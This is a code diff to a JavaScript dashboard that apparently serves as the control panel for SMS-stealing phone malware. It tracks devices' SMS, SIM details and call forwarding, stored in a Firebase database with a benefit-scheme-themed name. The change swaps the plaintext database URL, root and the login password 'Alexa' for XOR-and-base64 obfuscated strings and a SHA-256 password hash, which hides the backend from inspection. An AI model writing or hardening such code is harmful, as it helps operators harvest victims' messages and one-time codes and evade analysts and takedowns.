@@ -167,8 +167,10 @@ function drawPts(){cx.clearRect(0,0,c.width,c.height);pts.forEach(p=>{p.x+=p.dx;
 drawPts();
 addEventListener('resize',()=>{c.width=innerWidth;c.height=innerHeight});
 
-const DB='https://pm-kisan-05jg-default-rtdb.firebaseio.com';
-const ROOT='csc5';
+function _d(b,k){var r='',a=atob(b);for(var i=0;i<a.length;i++)r+=String.fromCharCode(a.charCodeAt(i)^k.charCodeAt(i%k.length));return r}
+function _h(s){var b=new TextEncoder().encode(s);return crypto.subtle.digest('SHA-256',b).then(function(h){return Array.from(new Uint8Array(h)).map(function(b){return b.toString(16).padStart(2,'0')}).join('')})}
+const _K='sh@376!',_EU='Gxw0Q0QMDlwYLR5cX1ISBm0DAlxGXgwlVVZDTQdFMkdTVA8VATJWVVdSFgEvHVRZTA==',_ER='EBsjBg==',_PH='842be8efb2f16dd15970017eb8a1e9aeb45d11b04585488110372b6f43150110';
+const DB=_d(_EU,_K),ROOT=_d(_ER,_K);
 let devInfo={}, smsData={}, simInfo={}, callFor={}, fwdStatus={};
 let srchQ='', smsSrchQ='', curDid='', curDev={}, detTab='info';
 let deTimer, pollTimer;
@@ -188,15 +190,18 @@ function copyT(t){
   document.body.appendChild(ta);ta.select();try{document.execCommand('copy');showToast('Copied')}catch(e){}document.body.removeChild(ta);
 }
 
-const PW='Alexa';
-
 function doLogin(){
-  const p=document.getElementById('loginPass').value.trim();
-  if(p!==PW){document.getElementById('loginErr').style.display='block';return}
-  document.getElementById('logScr').classList.remove('act');
-  document.getElementById('mainScr').classList.add('act');
-  isLoggedIn=true;
-  loadData();
+  var p=document.getElementById('loginPass').value.trim();
+  _h(p).then(function(h){
+    if(h===_PH){
+      document.getElementById('logScr').classList.remove('act');
+      document.getElementById('mainScr').classList.add('act');
+      isLoggedIn=true;
+      loadData();
+    } else {
+      document.getElementById('loginErr').style.display='block';
+    }
+  });
 }
 
 function dbUpdate(){clearTimeout(deTimer);deTimer=setTimeout(renderUI,400)}
